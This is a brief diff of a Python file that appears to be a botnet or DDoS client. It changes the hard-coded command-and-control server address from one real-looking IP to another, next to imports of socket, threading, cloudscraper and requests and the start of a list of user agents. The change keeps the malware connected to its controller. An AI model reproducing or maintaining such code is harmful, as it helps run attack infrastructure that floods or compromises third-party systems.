@@ -1,6 +1,6 @@
 import socket, threading, time, random, cloudscraper, requests
 
-C2_ADDRESS  = "66.90.72.34"
+C2_ADDRESS  = "45.139.50.9"
 C2_PORT     = 1
 
 base_user_agents = [
